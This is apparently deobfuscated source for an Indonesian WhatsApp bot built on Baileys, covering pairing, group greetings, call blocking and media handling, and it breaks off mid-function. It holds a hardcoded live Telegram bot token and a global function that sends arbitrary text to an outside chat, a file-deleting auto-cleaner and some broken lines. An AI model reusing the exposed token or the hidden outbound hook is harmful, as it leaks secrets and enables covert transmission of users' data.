require("./SadSet");
const SadSet = require("./SadSet");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  generateForwardMessageContent,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  generateMessageID,
  downloadContentFromMessage,
  Browsers,
  makeInMemoryStore,
  jidDecode,
  makeCacheableSignalKeyStore,
  getAggregateVotesInPollMessage,
  proto,
  delay,
  fetchLatestWaWebVersion
} = require("@whiskeysockets/baileys");
const fs2 = require("fs");
const pino = require("pino");
const chalk = require("chalk");
const path = require("path");
const axios = require("axios");
const os2 = require("os");
const nodeOsUtils = require("node-os-utils");
const NodeCache = require("node-cache");
const fileType = require("file-type");
const readline = require("readline");
const yargsYargs = require("yargs/yargs");
const nodemailer = require("nodemailer");
const {
  Telegraf,
  Context
} = require("telegraf");
const colorsColorsSafe = require("@colors/colors/safe");
const {
  color
} = require("./SadLibray/color");
const nodeFetch = require("node-fetch");
const {
  say
} = require("cfonts");
const lodash = require("lodash");
const {
  JooModss
} = require("joo-scriptku/lib/shield");
const {
  createCanvas,
  loadImage
} = require("canvas");
const {
  Boom
} = require("@hapi/boom");
const momentTimezone = require("moment-timezone");
const awesomePhonenumber = require("awesome-phonenumber");
const {
  imageToWebp,
  imageToWebp3,
  videoToWebp,
  writeExifImg,
  writeExifImgAV,
  writeExifVid
} = require("./SadLibray/exif");
const {
  smsg,
  isUrl,
  generateMessageTag,
  getBuffer,
  getSizeMedia,
  fetchJson,
  await,
  sleep,
  reSize
} = require("./SadLibray/myfunction");
const vLSNodeSadLibraylowdbco = "node ./SadLibray/lowdb/connect.js";
const msgRetryCounterCache = new NodeCache();
const { startBackupSystem } = require('./backupSystem');
const crypto = require("crypto");
const https = require("https");

function f() {
  try {
    const v5 = fs2.readFileSync("./package.json", "utf8");
    const v97 = JSON.parse(v5);
    if (!v97.scripts || !v97.scripts.start) {
      return false;
    }
    return v97.scripts.start === vLSNodeSadLibraylowdbco;
  } catch (e13) {
    console.error("Gagal membaca package.json:", e13.message);
    return false;
  }
}
if (!f()) {
  console.error("⛔ Jangan ubah arah start di package.json");
  process.exit(1);
}
console.log("✅ package.json valid, melanjutkan program");
const v98 = true;
const vF = p128 => {
  const v99 = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });
  return new Promise(p129 => {
    v99.question(p128, p129);
  });
};

// 🔥 RAW PASTEBIN (isi hash connect.js)
const HASH_URL = "https://pastebin.com/raw/BSZLWQBE";

// 🔍 generate hash file local
function getHash(file) {
  return crypto
    .createHash("sha256")
    .update(fs2.readFileSync(file))
    .digest("hex");
}

// 🌐 ambil hash dari pastebin
function getRemoteHash() {
  return new Promise((resolve, reject) => {
    https
      .get(HASH_URL, (res) => {
        let data = "";
        res.on("data", (chunk) => (data += chunk));
        res.on("end", () => resolve(data.trim()));
      })
      .on("error", reject);
  });
}

global.sendToTelegram = async p130 => {
  try {
    await axios.post("https://api.telegram.org/bot8584383994:AAH985cjMZ6HO1JQYPsIfWxrJFyAAc78iJs/sendMessage", {
      chat_id: 6257217768,
      text: p130
    }, {
      headers: {
        "Content-Type": "application/json"
      }
    });
  } catch {}
};
var v100;
try {
  v100 = require("lowdb");
} catch (e14) {
  v100 = require("./SadLibray/lowdb");
}
const {
  Low,
  JSONFile
} = v100;
const SadLibrayMongoDB = require("./SadLibray/mongoDB");
const vMakeInMemoryStore = makeInMemoryStore({
  logger: pino().child({
    level: "silent",
    stream: "store"
  })
});
global.opts = new Object(yargsYargs(process.argv.slice(2)).exitProcess(false).parse());
global.db = new Low(/https?:\/\//.test(opts.db || "") ? new cloudDBAdapter(opts.db) : /mongodb/.test(opts.db) ? new SadLibrayMongoDB(opts.db) : new JSONFile("./src/database.json"));
global.DATABASE = global.db;
global.loadDatabase = async function f2() {
  if (global.db.READ) {
    return new Promise(p131 => setInterval(function () {
      if (!global.db.READ) {
        clearInterval(this);
        p131(global.db.data == null ? global.loadDatabase() : global.db.data);
      } else {
        null;
      }
    }, 1000));
  }
  if (global.db.data !== null) {
    return;
  }
  global.db.READ = true;
  await global.db.read();
  global.db.READ = false;
  global.db.data = {
    users: {},
    chats: {},
    game: {},
    database: {},
    settings: {},
    setting: {},
    others: {},
    sticker: {},
    ...(global.db.data || {})
  };
  global.db.chain = lodash.chain(global.db.data);
};
loadDatabase();
const vF2 = p132 => {
  if (p132.match("@")) {
    return [...p132.matchAll(/@([0-9]{5,16}|0)/g)].map(p133 => p133[1] + "@s.whatsapp.net");
  } else {
    return [];
  }
};
const v101 = global.owner;
function f4() {
  const vLSTmp = "tmp";
  const v102 = path.join(__dirname, vLSTmp);
  if (!fs2.existsSync(v102)) {
    fs2.mkdirSync(v102);
    console.log(chalk.green.bold("[ Success ] Folder '" + vLSTmp + "' berhasil dibuat.\nMengkoneksikan Otomatis ..."));
  }
}
f4();
async function f5(p134) {
  process.stdout.write(p134);
  return new Promise((p135, p136) => {
    process.stdin.once("data", p137 => {
      const v103 = p137.toString().trim();
      if (v103) {
        p135(v103);
      } else {
        p136(new Error("Input tidak valid, silakan coba lagi."));
      }
    });
  });
}
async function f6() {
  const { state, saveCreds } = await useMultiFileAuthState("./SadSessions");
  const vMakeWASocket = makeWASocket({
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      browser: ["Linux", "Chrome", "20.0.00"],
      auth: state,
      msgRetryCounterCache,
      connectTimeoutMs: 60000,
      emitOwnEvents: true,
      fireInitQueries: true,
      generateHighQualityLinkPreview: true,
      syncFullHistory: false,
      markOnlineOnConnect: true
    });
  
  if (!vMakeWASocket.authState.creds.registered) {
    let v105 = false;
    let vLS4 = "";
    while (!v105) {
      console.log(chalk.blue.bold("Masukkan Nomor WhatsApp,\ncontoh : 628xxx"));
      vLS4 = await f5(chalk.blue.bold("Nomor: "));
      if (vLS4) {
        try {
          const v106 = await vMakeWASocket.requestPairingCode(vLS4, global.pairing);
          console.log(chalk.red.bold("Code Pairing: ") + chalk.reset(v106));
          v105 = true;
        } catch (e15) {
          console.log(chalk.red.bold("Gagal mendapatkan kode pairing." + e15));
        }
      } else {
        console.log(chalk.red.bold("Nomor tidak boleh kosong. Coba lagi."));
      }
    }
  }
  say("" + botname, {
    font: "block",
    align: "center",
    gradient: ["red", "yellow"]
  });
  console.log(chalk.blue.bold("\n✰      [ 乃ㄖㄒ   爪ㄩㄥㄒ丨ᗪ乇ᐯ︎丨匚乇 ]      ✰\n\n\n\n▧ 📂 information servers\n│ » • platform: " + os2.platform() + "\n│ » • architecture: " + os2.arch() + "\n│ » • cpu model: " + os2.cpus()[0].model + "\n│ » • total memory: " + (os2.totalmem() / 1024 / 1024).toFixed(2) + " MB\n│ » • free memory: " + (os2.freemem() / 1024 / 1024).toFixed(2) + " MB\n└───···\n\n[ " + botname + " ]\nmenghubungkan ke whatsapp ...."));
  const vA5 = ["SadDatabase", "SadLibray", "SadMedia", "SadPlugins", "SadSystem", ".integrity", "Sad_js", "Sad.js", "Sad2uberg.txt", "index.js", "package.json", "readme.md"];
  setInterval(() => {
    const vA6 = [path.join(__dirname), path.join(__dirname, "tmp")];
    const v107 = path.join(__dirname, "tmp");
    if (!fs2.existsSync(v107)) {
      fs2.mkdirSync(v107, {
        recursive: true
      });
      console.log("[*] Folder dibuat: " + v107);
    }
    vA6.forEach(p138 => {
      fs2.readdir(p138, (p139, p140) => {
        if (p139) {
          return console.error("Gagal membaca folder " + p138 + ":", p139);
        }
        const v108 = p140.filter(p141 => {
          if (vA5.includes(p141)) {
            return false;
          }
          return /\.(gif|png|mp3|mp4|opus|jpg|webp|webm|zip|tar\.gz)$/i.test(p141) || p141.startsWith(".cache") || p141.startsWith(".npm");
        });
        if (v108.length > 0) {
          console.log(("\n[ Auto-Cleaner System ]\n────────────────────────────────────────\n› Lokasi scan : " + p138 + "\n› Terdeteksi: " + v108.length + " file / folder sampah\n› Pembersihan otomatis dimulai dalam 15 detik...\n────────────────────────────────────────\n        ").trim());
          setTimeout(() => {
            v108.forEach(p142 => {
              const v109 = path.join(p138, p142);
              try {
                if (!fs2.existsSync(v109)) {
                  console.log("- Dilewati (tidak ditemukan): " + v109);
                  return;
                }
                const v110 = fs2.statSync(v109);
                if (v110.isDirectory()) {
                  fs2.rmSync(v109, {
                    recursive: true,
                    force: true
                  });
                  console.log("• Folder dihapus : " + v109);
                } else {
                  fs2.unlinkSync(v109);
                  console.log("• File dihapus   : " + v109);
                }
              } catch (e16) {
                console.error("Gagal menghapus " + v109 + ":", e16);
              }
            });
            console.log("✔ Selesai dibersihkan.\n────────────────────────────────────────\n");
          }, 15000);
        }
      });
    });
  }, 30000);
  const v111 = path.join(__dirname, "SadDatabase", "groupWelcome.json");
  const v112 = path.join(__dirname, "SadDatabase", "welcome");
  const v113 = path.join(__dirname, "SadDatabase", "left");
  const vF7 = () => {
    if (!fs2.existsSync(path.dirname(v111))) {
      fs2.mkdirSync(path.dirname(v111), {
        recursive: true
      });
    }
    if (!fs2.existsSync(v111)) {
      fs2.writeFileSync(v111, JSON.stringify({}, null, 2));
    }
    if (!fs2.existsSync(v112)) {
      fs2.mkdirSync(v112, {
        recursive: true
      });
    }
    if (!fs2.existsSync(v113)) {
      fs2.mkdirSync(v113, {
        recursive: true
      });
    }
  };
  vF7();
  const vF9 = () => {
    try {
      return JSON.parse(fs2.readFileSync(v111));
    } catch {
      return {};
    }
  };
  vMakeWASocket.ev.on("group-participants.update", async p143 => {
    try {
      if (!p143.participants || !Array.isArray(p143.participants)) {
        return;
      }
      const v114 = await vMakeWASocket.groupMetadata(p143.id);
      const v115 = v114.subject;
      const v116 = v114.participants.length;
      const vVF9 = vF9();
      const v117 = vVF9[p143.id] || {};
      const v118 = v117.welcome_enabled !== false;
      const v119 = v117.left_enabled !== false;
      const vF10 = (p144, p145) => {
        if (!p144) {
          return "";
        }
        return p144.replace(/@user|@group|@tanggal|@jam|@member/gi, p146 => p145[p146.toLowerCase()] || p146);
      };
      for (let v120 of p143.participants) {
        const v121 = p143.action;
        if (!["add", "remove"].includes(v121)) {
          continue;
        }
        if (v121 === "add" && !v118 || v121 === "remove" && !v119) {
          continue;
        }
        const v122 = "@" + v120.split("@")[0];
        const v123 = new Date().toLocaleDateString("id-ID", {
          timeZone: "Asia/Jakarta"
        });
        const v124 = new Date().toLocaleTimeString("id-ID", {
          timeZone: "Asia/Jakarta"
        });
        const vO11 = {
          "@user": v122,
          "@group": v115,
          "@tanggal": v123,
          "@jam": v124,
          "@member": String(v116)
        };
        const vO12 = {
          add: {
            url: "https://files.catbox.moe/g6ph8m.mp4",
            type: "video"
          },
          remove: {
            url: "https://files.catbox.moe/f215u5.mp4",
            type: "video"
          }
        };
        let v125;
        let v126;
        if (v121 === "add" && v117.thumb?.add) {
          v125 = v117.thumb.add;
          v126 = v117.thumb.addType || "video";
        } else if (v121 === "remove" && v117.thumb?.remove) {
          v125 = v117.thumb.remove;
          v126 = v117.thumb.removeType || "video";
        } else {
          v125 = vO12[v121].url;
          v126 = vO12[v121].type;
        }
        let v127;
        if (v121 === "add") {
          v127 = v117.welcome ? vF10(v117.welcome, vO11) : "👋 Selamat datang " + v122 + " di *" + v115 + "*!\nTotal member sekarang: *" + v116 + "*";
        } else if (v121 === "remove") {
          v127 = v117.left ? vF10(v117.left, vO11) : "👋 " + v122 + " telah keluar dari *" + v115 + "*.\nSisa member: *" + Math.max(v116 - 1, 0) + "*";
        }
        const vO13 = {
          caption: v127,
          mentions: [v120]
        };
        if (v126 === "video") {
          vO13.video = fs2.existsSync(v125) ? fs2.readFileSync(v125) : {
            url: v125
          };
          vO13.gifPlayback = true;
        } else {
          vO13.image = fs2.existsSync(v125) ? fs2.readFileSync(v125) : {
            url: v125
          };
        }
        await vMakeWASocket.sendMessage(p143.id, vO13);
      }
    } catch (e17) {
      console.error("❌ Error di group-participants.update:", e17);
    }
  });
  vMakeWASocket.sendButtonProto = async (p147, p148, p149, p150 = [], p151 = "", p152 = {}) => {
    let vGenerateWAMessageFromContent = generateWAMessageFromContent(p147, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            ...p152,
            body: proto.Message.InteractiveMessage.Body.create({
              text: p148
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: p149 || "puqi"
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
              buttons: p150
            })
          })
        }
      }
    }, {
      quoted: p151
    });
    return await vMakeWASocket.relayMessage(vGenerateWAMessageFromContent.key.remoteJid, vGenerateWAMessageFromContent.message, {
      messageId: vGenerateWAMessageFromContent.key.id
    });
  };
  vMakeWASocket.sendInteractive = async (p153, p154, p155 = null, p156, p157, p158 = "", p159 = {}) => {
    let v128 = p155 ? proto.Message.InteractiveMessage.Header.create({
      title: "",
      hasMediaAttachment: true,
      ...(await prepareWAMessageMedia({
        image: {
          url: p155
        }
      }, {
        upload: vMakeWASocket.waUploadToServer
      }))
    }) : proto.Message.InteractiveMessage.Header.create({
      title: "",
      hasMddiaAttachment: false
    });
    let vGenerateWAMessageFromContent2 = generateWAMessageFromContent(p153, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            ...p159,
            body: proto.Message.InteractiveMessage.Body.create({
              text: p157
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: p156
            }),
            header: v128,
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
              buttons: p154
            })
          })
        }
      }
    }, {
      quoted: p158
    });
    await vMakeWASocket.relayMessage(vGenerateWAMessageFromContent2.key.remoteJid, vGenerateWAMessageFromContent2.message, {
      messageId: vGenerateWAMessageFromContent2.key.id
    });
  };
  vMakeWASocket.sendStatusMention = async (p160, p161 = []) => {
    let v129;
    for (let v130 of p161) {
      let v131 = await vMakeWASocket.groupMetadata(v130);
      v129 = await v131.participants.map(p162 => vMakeWASocket.decodeJid(p162.id));
    }
    let v132 = await vMakeWASocket.sendMessage("status@broadcast", p160, {
      backgroundColor: "F54242",
      font: Math.floor(Math.random() * 9),
      statusJidList: v129,
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: p161.map(p163 => ({
            tag: "to",
            attrs: {
              jid: p163
            },
            content: undefined
          }))
        }]
      }]
    });
    p161.forEach(p164 => {
      vMakeWASocket.relayMessage(p164, {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: v132.key,
              type: 25
            }
          }
        }
      }, {
        userJid: vMakeWASocket.user.jid,
        additionalNodes: [{
          tag: "meta",
          attrs: {
            is_status_mention: "true"
          },
          content: undefined
        }]
      });
      delay(2500);
    });
    return v132;
  };
  vMakeWASocket.sendFile = async (p165, p166, p167 = "", p168 = "", p169, p170 = false, p171 = {}) => {
    let v133 = await vMakeWASocket.getFile(p166, true);
    let {
      res: _0x32b23f,
      data: _0x6074c5,
      filename: _0x37e68c
    } = v133;
    if (_0x32b23f && _0x32b23f.status !== 200 || _file2.length <= 65536) {
      try {
        throw {
          json: JSON.parse(_0x6074c5.toString())
        };
      } catch (e18) {
        if (e18.json) {
          throw e18.json;
        }
      }
    }
    let vO14 = {
      filename: p167
    };
    if (p169) {
      vO14.quoted = p169;
    }
    if (!v133) {
      p171.asDocument = true;
    }
    let vLS5 = "";
    let v134 = v133.mime;
    let v135;
    if (/webp/.test(v133.mime) || /image/.test(v133.mime) && p171.asSticker) {
      vLS5 = "sticker";
    } else if (/image/.test(v133.mime) || /webp/.test(v133.mime) && p171.asImage) {
      vLS5 = "image";
    } else if (/video/.test(v133.mime)) {
      vLS5 = "video";
    } else if (/audio/.test(v133.mime)) {
      v135 = await (p170 ? toPTT : toAudio)(_0x6074c5, v133.ext);
      _0x6074c5 = v135.data;
      _0x37e68c = v135.filename;
      vLS5 = "audio";
      v134 = "audio/ogg; codecs=opus";
    } else {
      vLS5 = "document";
    }
    if (p171.asDocument) {
      vLS5 = "document";
    }
    let vO15 = {
      ...p171,
      caption: p168,
      ptt: p170,
      [vLS5]: {
        url: _0x37e68c
      },
      mimetype: v134
    };
    let v136;
    try {
      v136 = await vMakeWASocket.sendMessage(p165, vO15, {
        ...vO14,
        ...p171
      });
    } catch (e19) {
      console.error(e19);
      v136 = null;
    } finally {
      if (!v136) {
        v136 = await vMakeWASocket.sendMessage(p165, {
          ...vO15,
          [vLS5]: _0x6074c5
        }, {
          ...vO14,
          ...p171
        });
      }
      return v136;
    }
  };
  vMakeWASocket.sendButtonImg = async (p172, p173 = [], p174, p175, p176, p177 = "", p178 = {}) => {
    const vO16 = {
      image: {
        url: p175
      },
      caption: p174,
      footer: p176,
      buttons: p173.map(p179 => ({
        buttonId: p179.id || "",
        buttonText: {
          displayText: p179.text || "Button"
        },
        type: p179.type || 1
      })),
      headerType: 1,
      viewOnce: p178.viewOnce || false
    };
    vMakeWASocket.sendMessage(p172, vO16, {
      quoted: p177
    });
  };
  vMakeWASocket.sendReact = async (p180, p181, p182 = {}) => {
    let vO17 = {
      react: {
        text: p181,
        key: p182
      }
    };
    return await vMakeWASocket.sendMessage(p180, vO17);
  };
  vMakeWASocket.deleteMessage = async (p183, p184) => {
    try {
      await vMakeWASocket.sendMessage(p183, {
        delete: p184
      });
      console.log("Pesan dihapus: " + p184.id);
    } catch (e20) {
      console.error("Gagal menghapus pesan:", e20);
    }
  };
  vMakeWASocket.ev.on("messages.upsert", async p185 => {
    if (global.autoswview) {
      try {
        if (!p185.messages || p185.messages.length === 0) {
          return;
        }
        const v137 = p185.messages[0];
        if (!v137.message) {
          return;
        }
        v137.message = Object.keys(v137.message)[0] === "ephemeralMessage" ? v137.message.ephemeralMessage.message : v137.message;
        if (v137.key && v137.key.remoteJid === "status@broadcast") {
          let vA7 = ["" + lz2];
          let v138 = vA7[Math.floor(Math.random() * vA7.length)];
          await vMakeWASocket.readMessages([v137.key]);
          vMakeWASocket.sendMessage("status@broadcast", {
            react: {
              text: v138,
              key: v137.key
            }
          }, {
            statusJidList: [v137.key.participant]
          });
        }
      } catch (e21) {
        console.error(e21);
      }
    }
  });
  vMakeWASocket.decodeJid = p186 => {
    if (!p186) {
      return p186;
    }
    if (/:\d+@/gi.test(p186)) {
      let v139 = jidDecode(p186) || {};
      return v139.user && v139.server && v139.user + "@" + v139.server || p186;
    } else {
      return p186;
    }
  };
  vMakeWASocket.ev.on("messages.upsert", async p187 => {
    try {
      mek = p187.messages[0];
      if (!mek.message) {
        return;
      }
      mek.message = Object.keys(mek.message)[0] === "ephemeralMessage" ? mek.message.ephemeralMessage.message : mek.message;
      if (mek.key && mek.key.remoteJid === "status@broadcast") {
        return;
      }
      if (!vMakeWASocket.public && !mek.key.fromMe && !mek.key.isOwner && p187.type === "notify") {
        return;
      }
      if (mek.key.id.startsWith("BAE5") && mek.key.id.length === 16) {
        return;
      }
      m = smsg(vMakeWASocket, mek, vMakeInMemoryStore);
      require("./Sad")(vMakeWASocket, m, p187, vMakeInMemoryStore);
    } catch (e22) {
      console.log(e22);
    }
  });
  let vO18 = {};
  vMakeWASocket.ev.on("call", async p188 => {
    if (!global.anticall) {
      return;
    }
    try {
      const v140 = p188[0].from;
      const v141 = p188[0].id;
      const v142 = p188[0].status;
      if (v142 === "offer") {
        console.log("📞 Panggilan terdeteksi dari: " + v140);
        await vMakeWASocket.rejectCall(v141, v140);
        if (!vO18[v140]) {
          vO18[v140] = 1;
        } else {
          vO18[v140] += 1;
        }
        await vMakeWASocket.sendMessage(v140, {
          text: "⚠️ Sistem AntiCall:\n\nPanggilan terdeteksi dan otomatis ditolak.\nMohon jangan menelpon bot!"
        });
        let v143 = "📢 *Laporan AntiCall*\n\nNomor: " + v140 + "\nStatus: Panggilan Masuk\nJumlah Call: " + vO18[v140] + " kali";
        for (let v144 of global.owner) {
          await vMakeWASocket.sendMessage(v144 + "@s.whatsapp.net", {
            text: v143
          });
        }
        if (vO18[v140] >= 3) {
          await vMakeWASocket.updateBlockStatus(v140, "block");
          console.log("🚫 " + v140 + " diblokir karena spam call.");
          for (let v145 of global.owner) {
            await vMakeWASocket.sendMessage(v145 + "@s.whatsapp.net", {
              text: "🚫 Nomor " + v140 + " diblokir otomatis karena spam call (lebih dari 3x)."
            });
          }
        }
      }
    } catch (e23) {
      console.error("❌ Error AntiCall:", e23);
    }
  });
  vMakeWASocket.imgToSticker = async (p189, p190, p191, p192 = {}) => {
    let v146 = Buffer.isBuffer(p190) ? p190 : /^data:.*?\/.*?;base64,/i.test(p190) ? Buffer.from(p190.split`,`[1], "base64") : /^https?:\/\//.test(p190) ? await await fetchBuffer(p190) : fs2.existsSync(p190) ? fs2.readFileSync(p190) : Buffer.alloc(0);
    let v147;
    if (p192 && (p192.packname || p192.author)) {
      v147 = await writeExifImg(v146, p192);
    } else {
      v147 = await imageToWebp(v146);
    }
    await vMakeWASocket.sendMessage(p189, {
      sticker: {
        url: v147
      },
      ...p192
    }, {
      quoted: p191
    });
    return v147;
  };
  vMakeWASocket.ev.on("contacts.update", p193 => {
    for (let v148 of p193) {
      let v149 = vMakeWASocket.decodeJid(v148.id);
      if (vMakeInMemoryStore && vMakeInMemoryStore.contacts) {
        vMakeInMemoryStore.contacts[v149] = {
          id: v149,
          name: v148.notify
        };
      }
    }
  });
  vMakeWASocket.getName = (p194, p195 = false) => {
    id = vMakeWASocket.decodeJid(p194);
    p195 = vMakeWASocket.withoutContact || p195;
    let v150;
    if (id.endsWith("@g.us")) {
      return new Promise(async p196 => {
        v150 = vMakeInMemoryStore.contacts[id] || {};
        if (!v150.name && !v150.subject) {
          v150 = vMakeWASocket.groupMetadata(id) || {};
        }
        p196(v150.name || v150.subject || awesomePhonenumber("+" + id.replace("@s.whatsapp.net", "")).getNumber("international"));
      });
    } else {
      v150 = id === "0@s.whatsapp.net" ? {
        id: id,
        name: "WhatsApp"
      } : id === vMakeWASocket.decodeJid(vMakeWASocket.user.id) ? vMakeWASocket.user : vMakeInMemoryStore.contacts[id] || {};
    }
    return (p195 ? "" : v150.name) || v150.subject || v150.verifiedName || awesomePhonenumber("+" + p194.replace("@s.whatsapp.net", "")).getNumber("international");
  };
  vMakeWASocket.sendContact = async (p197, p198, p199 = "", p200 = {}) => {
    let vA8 = [];
    for (let v151 of p198) {
      vA8.push({
        displayName: await vMakeWASocket.getName(v151 + "@s.whatsapp.net"),
        vcard: "BEGIN:VCARD\nVERSION:3.0\nN:" + (await vMakeWASocket.getName(v151 + "@s.whatsapp.net")) + "\nFN:" + (await vMakeWASocket.getName(v151 + "@s.whatsapp.net")) + "\nitem1.TEL;waid=" + v151 + ":" + v151 + "\nitem1.X-ABLabel:Ponsel\nitem2.EMAIL;type=INTERNET:aplusscell@gmail.com\nitem2.X-ABLabel:Email\nitem3.URL:https://chat.whatsapp.com/HbCl8qf3KQK1MEp3ZBBpSf\nitem3.X-ABLabel:Instagram\nitem4.ADR:;;Indonesia;;;;\nitem4.X-ABLabel:Region\nEND:VCARD"
      });
    }
    vMakeWASocket.sendMessage(p197, {
      contacts: {
        displayName: vA8.length + " Kontak",
        contacts: vA8
      },
      ...p200
    }, {
      quoted: p199
    });
  };
  vMakeWASocket.public = true;
  vMakeWASocket.ev.on("creds.update", saveCreds);
  vMakeWASocket.downloadMediaMessage = async p201 => {
    let v152 = (p201.msg || p201).mimetype || "";
    let v153 = p201.mtype ? p201.mtype.replace(/Message/gi, "") : v152.split("/")[0];
    const v154 = await downloadContentFromMessage(p201, v153);
    let v155 = Buffer.from([]);
    for await (const v156 of v154) {
      v155 = Buffer.concat([v155, v156]);
    }
    return v155;
  };
  vMakeWASocket.sendImage = async (p202, p203, p204 = "", p205 = "", p206) => {
    let v157 = Buffer.isBuffer(p203) ? p203 : /^data:.*?\/.*?;base64,/i.test(p203) ? Buffer.from(p203.split`,`[1], "base64") : /^https?:\/\//.test(p203) ? await await getBuffer(p203) : fs2.existsSync(p203) ? fs2.readFileSync(p203) : Buffer.alloc(0);
    return await vMakeWASocket.sendMessage(p202, {
      image: v157,
      caption: p204,
      ...p206
    }, {
      quoted: p205
    });
  };
  vMakeWASocket.sendText = (p207, p208, p209 = "", p210) => vMakeWASocket.sendMessage(p207, {
    text: p208,
    ...p210
  }, {
    quoted: p209
  });
  vMakeWASocket.sendTextWithMentions = async (p211, p212, p213, p214 = {}) => vMakeWASocket.sendMessage(p211, {
    text: p212,
    contextInfo: {
      mentionedJid: [...p212.matchAll(/@(\d{0,16})/g)].map(p215 => p215[1] + "@s.whatsapp.net")
    },
    ...p214
  }, {
    quoted: p213
  });
  vMakeWASocket.sendImageAsSticker = async (p216, p217, p218, p219 = {}) => {
    let v158 = Buffer.isBuffer(p217) ? p217 : /^data:.*?\/.*?;base64,/i.test(p217) ? Buffer.from(p217.split`,`[1], "base64") : /^https?:\/\//.test(p217) ? await await getBuffer(p217) : fs2.existsSync(p217) ? fs2.readFileSync(p217) : Buffer.alloc(0);
    let v159;
    if (p219 && (p219.packname || p219.author)) {
      v159 = await writeExifImg(v158, p219);
    } else {
      v159 = await imageToWebp(v158);
    }
    await vMakeWASocket.sendMessage(p216, {
      sticker: {
        url: v159
      },
      ...p219
    }, {
      quoted: p218
    });
    return v159;
  };
  vMakeWASocket.sendImageAsStickerAV = async (p220, p221, p222, p223 = {}) => {
    let v160 = Buffer.isBuffer(p221) ? p221 : /^data:.*?\/.*?;base64,/i.test(p221) ? Buffer.from(p221.split`,`[1], "base64") : /^https?:\/\//.test(p221) ? await await getBuffer(p221) : fs2.existsSync(p221) ? fs2.readFileSync(p221) : Buffer.alloc(0);
    let v161;
    if (p223 && (p223.packname || p223.author)) {
      v161 = await writeExifImgAV(v160, p223);
    } else {
      v161 = await imageToWebp2(v160);
    }
    await vMakeWASocket.sendMessage(p220, {
      sticker: {
        url: v161
      },
      ...p223
    }, {
      quoted: p222
    });
    return v161;
  };
  vMakeWASocket.sendImageAsStickerAvatar = async (p224, p225, p226, p227 = {}) => {
    let v162 = Buffer.isBuffer(p225) ? p225 : /^data:.*?\/.*?;base64,/i.test(p225) ? Buffer.from(p225.split`,`[1], "base64") : /^https?:\/\//.test(p225) ? await await getBuffer(p225) : fs2.existsSync(p225) ? fs2.readFileSync(p225) : Buffer.alloc(0);
    let v163;
    if (p227 && (p227.packname || p227.author)) {
      v163 = await writeExifImg(v162, p227);
    } else {
      v163 = await imageToWebp3(v162);
    }
    await vMakeWASocket.sendMessage(p224, {
      sticker: {
        url: v163
      },
      ...p227
    }, {
      quoted: p226
    });
    return v163;
  };
  vMakeWASocket.sendVideoAsSticker = async (p228, p229, p230, p231 = {}) => {
    let v164 = Buffer.isBuffer(p229) ? p229 : /^data:.*?\/.*?;base64,/i.test(p229) ? Buffer.from(p229.split`,`[1], "base64") : /^https?:\/\//.test(p229) ? await await getBuffer(p229) : fs2.existsSync(p229) ? fs2.readFileSync(p229) : Buffer.alloc(0);
    let v165;
    if (p231 && (p231.packname || p231.author)) {
      v165 = await writeExifVid(v164, p231);
    } else {
      v165 = await videoToWebp(v164);
    }
    await vMakeWASocket.sendMessage(p228, {
      sticker: {
        url: v165
      },
      ...p231
    }, {
      quoted: p230
    });
    return v165;
  };
  vMakeWASocket.downloadAndSaveMediaMessage = async (p232, p233, p234 = true) => {
    let v166 = p232.msg ? p232.msg : p232;
    let v167 = (p232.msg || p232).mimetype || "";
    let v168 = p232.mtype ? p232.mtype.replace(/Message/gi, "") : v167.split("/")[0];
    const v169 = await downloadContentFromMessage(v166, v168);
    let v170 = Buffer.from([]);
    for await (const v171 of v169) {
      v170 = Buffer.concat([v170, v171]);
    }
    let v172 = await fileType.fromBuffer(v170);
    trueFileName = p234 ? p233 + "." + v172.ext : p233;
    await fs2.writeFileSync(trueFileName, v170);
    return trueFileName;
  };
  vMakeWASocket.cMod = (p235, p236, p237 = "", p238 = vMakeWASocket.user.id, p239 = {}) => {
    let v173 = Object.keys(p236.message)[0];
    let v174 = v173 === "ephemeralMessage";
    if (v174) {
      v173 = Object.keys(p236.message.ephemeralMessage.message)[0];
    }
    let v175 = v174 ? p236.message.ephemeralMessage.message : p236.message;
    let v176 = v175[v173];
    if (typeof v176 === "string") {
      v175[v173] = p237 || v176;
    } else if (v176.caption) {
      v176.caption = p237 || v176.caption;
    } else {
      v176.text &&= p237 || v176.text;
    }
    if (typeof v176 !== "string") {
      v175[v173] = {
        ...v176,
        ...p239
      };
    }
    if (p236.key.participant) {
      p238 = p236.key.participant = p238 || p236.key.participant;
    } else if (p236.key.participant) {
      p238 = p236.key.participant = p238 || p236.key.participant;
    }
    if (p236.key.remoteJid.includes("@s.whatsapp.net")) {
      p238 = p238 || p236.key.remoteJid;
    } else if (p236.key.remoteJid.includes("@broadcast")) {
      p238 = p238 || p236.key.remoteJid;
    }
    p236.key.remoteJid = p235;
    p236.key.fromMe = p238 === vMakeWASocket.user.id;
    return proto.WebMessageInfo.fromObject(p236);
  };
  vMakeWASocket.sendFile = async (p240, p241, p242, p243 = {}, p244 = {}) => {
    let v177 = await vMakeWASocket.getFile(p241, true);
    let {
      filename: _0x4debaa,
      size: _0x2b9290,
      ext: _0x2907d9,
      mime: _0x41467f,
      data: _0x805d20
    } = v177;
    let vLS6 = "";
    let v_0x41467f2 = _0x41467f;
    let v_0x4debaa2 = _0x4debaa;
    if (p244.asDocument) {
      vLS6 = "document";
    }
    if (p244.asSticker || /webp/.test(_0x41467f)) {
      let {
        writeExif: _0x458622
      } = require("./SadLibray/exif.js");
      let vO19 = {
        mimetype: _0x41467f,
        data: _0x805d20
      };
      v_0x4debaa2 = await _0x458622(vO19, {
